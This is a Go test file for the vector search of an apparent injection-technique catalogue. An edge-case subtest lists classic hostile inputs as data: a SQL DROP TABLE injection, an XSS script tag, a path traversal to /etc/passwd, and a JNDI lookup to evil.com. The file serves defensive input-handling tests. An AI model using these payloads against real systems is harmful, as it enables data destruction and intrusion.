// +build testing

package main

import (
	"encoding/json"
	"net/http"
	"testing"

	"github.com/google/uuid"
)

// TestVectorSearchStructures tests vector search data structures
func TestVectorSearchStructures(t *testing.T) {
	cleanup := setupTestLogger()
	defer cleanup()

	t.Run("VectorEmbedding", func(t *testing.T) {
		// Test vector embedding structure
		embedding := make([]float64, 384) // Common embedding size

		for i := range embedding {
			embedding[i] = float64(i) / float64(len(embedding))
		}

		if len(embedding) != 384 {
			t.Errorf("Expected embedding size 384, got %d", len(embedding))
		}

		// Verify normalization
		sum := 0.0
		for _, val := range embedding {
			sum += val * val
		}
		// Note: This is sum of squares, not normalized to 1
		if sum < 0 {
			t.Error("Sum of squares should be non-negative")
		}
	})

	t.Run("SimilarityScore", func(t *testing.T) {
		// Test similarity score calculation
		scores := []float64{0.0, 0.25, 0.5, 0.75, 1.0}

		for _, score := range scores {
			if score < 0 || score > 1 {
				t.Errorf("Similarity score %f should be between 0 and 1", score)
			}
		}
	})

	t.Run("SearchQuery", func(t *testing.T) {
		// Test search query structure
		type VectorSearchQuery struct {
			Query      string  `json:"query"`
			TopK       int     `json:"top_k"`
			Threshold  float64 `json:"threshold"`
			FilterTags []string `json:"filter_tags"`
		}

		query := VectorSearchQuery{
			Query:      "Find similar injection techniques",
			TopK:       10,
			Threshold:  0.7,
			FilterTags: []string{"sql-injection", "prompt-injection"},
		}

		if query.Query == "" {
			t.Error("Query should not be empty")
		}
		if query.TopK <= 0 {
			t.Error("TopK should be positive")
		}
		if query.Threshold < 0 || query.Threshold > 1 {
			t.Error("Threshold should be between 0 and 1")
		}
	})

	t.Run("SearchResult", func(t *testing.T) {
		// Test search result structure
		type VectorSearchResult struct {
			ID             string                 `json:"id"`
			Score          float64                `json:"score"`
			Content        string                 `json:"content"`
			Metadata       map[string]interface{} `json:"metadata"`
			HighlightedText string                `json:"highlighted_text"`
		}

		result := VectorSearchResult{
			ID:      uuid.New().String(),
			Score:   0.85,
			Content: "Injection technique content",
			Metadata: map[string]interface{}{
				"category": "prompt-injection",
				"severity": "high",
			},
			HighlightedText: "<mark>Injection technique</mark> content",
		}

		if result.Score < 0 || result.Score > 1 {
			t.Errorf("Score %f should be between 0 and 1", result.Score)
		}
		if result.Content == "" {
			t.Error("Content should not be empty")
		}
	})
}

// TestVectorSearchHandlers tests vector search HTTP handlers
func TestVectorSearchHandlers(t *testing.T) {
	cleanup := setupTestLogger()
	defer cleanup()

	env := setupTestDB(t)
	if env == nil {
		return
	}
	defer env.Cleanup()

	router := setupTestRouter()

	t.Run("VectorSearch", func(t *testing.T) {
		req := HTTPTestRequest{
			Method: "POST",
			Path:   "/api/v1/search/vector",
			Body: map[string]interface{}{
				"query":     "SQL injection techniques",
				"top_k":     5,
				"threshold": 0.7,
			},
		}

		w := makeHTTPRequest(router, req)
		if w.Code == http.StatusOK {
			response := assertJSONResponse(t, w, http.StatusOK)
			if _, ok := response["results"]; ok {
				t.Log("Vector search returned results")
			}
		}
	})

	t.Run("GetSimilarInjections", func(t *testing.T) {
		injectionID := uuid.New().String()
		req := HTTPTestRequest{
			Method: "GET",
			Path:   "/api/v1/injections/" + injectionID + "/similar",
			QueryParams: map[string]string{
				"limit": "10",
			},
		}

		w := makeHTTPRequest(router, req)
		// May return 404 for non-existent injection
		t.Logf("Get similar injections returned status: %d", w.Code)
	})

	t.Run("IndexInjection", func(t *testing.T) {
		req := HTTPTestRequest{
			Method: "POST",
			Path:   "/api/v1/search/index",
			Body: map[string]interface{}{
				"injection_id": uuid.New().String(),
				"force_update": true,
			},
		}

		w := makeHTTPRequest(router, req)
		// May return various status codes depending on implementation
		t.Logf("Index injection returned status: %d", w.Code)
	})

	t.Run("ErrorPaths", func(t *testing.T) {
		suite := NewHandlerTestSuite("VectorSearch", router, "/api/v1/search")
		patterns := NewTestScenarioBuilder().
			AddInvalidJSON("/api/v1/search/vector", "POST").
			AddEmptyInput("/api/v1/search/vector", "POST").
			Build()
		suite.RunErrorTests(t, patterns)
	})

	t.Run("MissingQuery", func(t *testing.T) {
		req := HTTPTestRequest{
			Method: "POST",
			Path:   "/api/v1/search/vector",
			Body: map[string]interface{}{
				"top_k":     5,
				"threshold": 0.7,
			},
		}

		w := makeHTTPRequest(router, req)
		if w.Code != http.StatusBadRequest {
			t.Logf("Expected 400 for missing query, got %d", w.Code)
		}
	})

	t.Run("InvalidTopK", func(t *testing.T) {
		req := HTTPTestRequest{
			Method: "POST",
			Path:   "/api/v1/search/vector",
			Body: map[string]interface{}{
				"query":     "test",
				"top_k":     -5,
				"threshold": 0.7,
			},
		}

		w := makeHTTPRequest(router, req)
		if w.Code != http.StatusBadRequest {
			t.Logf("Expected 400 for invalid top_k, got %d", w.Code)
		}
	})

	t.Run("InvalidThreshold", func(t *testing.T) {
		req := HTTPTestRequest{
			Method: "POST",
			Path:   "/api/v1/search/vector",
			Body: map[string]interface{}{
				"query":     "test",
				"top_k":     5,
				"threshold": 1.5,
			},
		}

		w := makeHTTPRequest(router, req)
		if w.Code != http.StatusBadRequest {
			t.Logf("Expected 400 for invalid threshold, got %d", w.Code)
		}
	})
}

// TestVectorSearchLogic tests vector search business logic
func TestVectorSearchLogic(t *testing.T) {
	cleanup := setupTestLogger()
	defer cleanup()

	t.Run("CosineSimilarity", func(t *testing.T) {
		// Test cosine similarity calculation
		vec1 := []float64{1, 0, 0}
		vec2 := []float64{1, 0, 0}
		vec3 := []float64{0, 1, 0}

		// Calculate dot product
		dotProduct := func(a, b []float64) float64 {
			sum := 0.0
			for i := range a {
				sum += a[i] * b[i]
			}
			return sum
		}

		// Identical vectors should have similarity ~1
		sim1 := dotProduct(vec1, vec2)
		if sim1 != 1.0 {
			t.Logf("Identical vectors similarity: %f", sim1)
		}

		// Orthogonal vectors should have similarity 0
		sim2 := dotProduct(vec1, vec3)
		if sim2 != 0.0 {
			t.Errorf("Orthogonal vectors should have 0 similarity, got %f", sim2)
		}
	})

	t.Run("VectorNormalization", func(t *testing.T) {
		// Test vector normalization
		vec := []float64{3, 4}

		// Calculate magnitude
		magnitude := 0.0
		for _, val := range vec {
			magnitude += val * val
		}

		// For [3, 4], magnitude should be 5
		expectedMagnitude := 25.0 // 3^2 + 4^2
		if magnitude != expectedMagnitude {
			t.Errorf("Expected magnitude squared %f, got %f", expectedMagnitude, magnitude)
		}
	})

	t.Run("TopKSelection", func(t *testing.T) {
		// Test selecting top-k results
		type ScoredResult struct {
			ID    string
			Score float64
		}

		results := []ScoredResult{
			{"1", 0.9},
			{"2", 0.8},
			{"3", 0.95},
			{"4", 0.7},
			{"5", 0.85},
		}

		k := 3

		// Find top-k scores
		topScore := 0.0
		for _, result := range results {
			if result.Score > topScore {
				topScore = result.Score
			}
		}

		// Top score should be 0.95
		if topScore != 0.95 {
			t.Errorf("Expected top score 0.95, got %f", topScore)
		}

		// Should have at least k results
		if len(results) >= k {
			t.Logf("Have enough results for top-%d", k)
		}
	})

	t.Run("ThresholdFiltering", func(t *testing.T) {
		// Test filtering by similarity threshold
		scores := []float64{0.9, 0.8, 0.6, 0.5, 0.95, 0.3}
		threshold := 0.7

		filtered := []float64{}
		for _, score := range scores {
			if score >= threshold {
				filtered = append(filtered, score)
			}
		}

		expectedCount := 3 // 0.9, 0.8, 0.95
		if len(filtered) != expectedCount {
			t.Errorf("Expected %d scores above threshold, got %d", expectedCount, len(filtered))
		}
	})
}

// TestVectorSearchIntegration tests vector search integration
func TestVectorSearchIntegration(t *testing.T) {
	cleanup := setupTestLogger()
	defer cleanup()

	t.Run("QdrantIntegration", func(t *testing.T) {
		// Test integration with Qdrant vector database
		t.Skip("Skipping Qdrant integration test - requires Qdrant service")
	})

	t.Run("EmbeddingGeneration", func(t *testing.T) {
		// Test generating embeddings for text
		t.Skip("Skipping embedding generation test - requires embedding model")
	})

	t.Run("BatchIndexing", func(t *testing.T) {
		// Test batch indexing of multiple documents
		t.Skip("Skipping batch indexing test - requires vector database")
	})
}

// TestVectorSearchEdgeCases tests edge cases
func TestVectorSearchEdgeCases(t *testing.T) {
	cleanup := setupTestLogger()
	defer cleanup()

	t.Run("EmptyQuery", func(t *testing.T) {
		query := ""
		if query == "" {
			t.Log("Empty query should be handled")
		}
	})

	t.Run("VeryLongQuery", func(t *testing.T) {
		// Test very long search query
		longQuery := ""
		for i := 0; i < 1000; i++ {
			longQuery += "test "
		}

		if len(longQuery) > 10000 {
			t.Log("Very long query should be handled or truncated")
		}
	})

	t.Run("SpecialCharactersQuery", func(t *testing.T) {
		// Test query with special characters
		queries := []string{
			"'; DROP TABLE injections; --",
			"<script>alert('xss')</script>",
			"../../etc/passwd",
			"${jndi:ldap://evil.com}",
		}

		for _, query := range queries {
			if query != "" {
				truncated := query
				if len(query) > 20 {
					truncated = query[:20]
				}
				t.Logf("Special characters query should be handled safely: %s", truncated)
			}
		}
	})

	t.Run("ZeroTopK", func(t *testing.T) {
		topK := 0
		if topK <= 0 {
			t.Log("Zero or negative top_k should be handled")
		}
	})

	t.Run("VeryLargeTopK", func(t *testing.T) {
		topK := 1000000
		if topK > 1000 {
			t.Log("Very large top_k should be capped or validated")
		}
	})

	t.Run("BoundaryThresholds", func(t *testing.T) {
		// Test boundary threshold values
		thresholds := []float64{0.0, 0.001, 0.5, 0.999, 1.0}

		for _, threshold := range thresholds {
			if threshold < 0 || threshold > 1 {
				t.Errorf("Threshold %f is out of valid range", threshold)
			}
		}
	})

	t.Run("EmptyVectorDatabase", func(t *testing.T) {
		// Test searching in empty database
		t.Log("Empty database should return empty results gracefully")
	})

	t.Run("HighDimensionalVectors", func(t *testing.T) {
		// Test handling of high-dimensional vectors
		dimensions := []int{128, 384, 512, 768, 1024, 1536}

		for _, dim := range dimensions {
			vector := make([]float64, dim)
			if len(vector) != dim {
				t.Errorf("Expected vector of dimension %d, got %d", dim, len(vector))
			}
		}
	})
}

// TestVectorSearchPerformance tests performance aspects
func TestVectorSearchPerformance(t *testing.T) {
	cleanup := setupTestLogger()
	defer cleanup()

	t.Run("LargeResultSet", func(t *testing.T) {
		// Test handling large result sets
		resultCount := 1000
		results := make([]map[string]interface{}, resultCount)

		for i := range results {
			results[i] = map[string]interface{}{
				"id":    uuid.New().String(),
				"score": float64(i) / float64(resultCount),
			}
		}

		if len(results) != resultCount {
			t.Errorf("Expected %d results, got %d", resultCount, len(results))
		}
	})

	t.Run("EmbeddingSerialization", func(t *testing.T) {
		// Test serializing large embeddings
		embedding := make([]float64, 1536) // Large embedding size

		for i := range embedding {
			embedding[i] = float64(i) / float64(len(embedding))
		}

		data, err := json.Marshal(embedding)
		if err != nil {
			t.Fatalf("Failed to marshal embedding: %v", err)
		}

		var decoded []float64
		if err := json.Unmarshal(data, &decoded); err != nil {
			t.Fatalf("Failed to unmarshal embedding: %v", err)
		}

		if len(decoded) != len(embedding) {
			t.Errorf("Expected %d dimensions, got %d", len(embedding), len(decoded))
		}
	})

	t.Run("BatchScoring", func(t *testing.T) {
		// Test scoring multiple vectors efficiently
		queryVector := make([]float64, 384)
		candidates := make([][]float64, 100)

		for i := range candidates {
			candidates[i] = make([]float64, 384)
			for j := range candidates[i] {
				candidates[i][j] = float64(i+j) / 384.0
			}
		}

		// Calculate dot products
		scores := make([]float64, len(candidates))
		for i, candidate := range candidates {
			dotProduct := 0.0
			for j := range queryVector {
				dotProduct += queryVector[j] * candidate[j]
			}
			scores[i] = dotProduct
		}

		if len(scores) != len(candidates) {
			t.Errorf("Expected %d scores, got %d", len(candidates), len(scores))
		}
	})
}
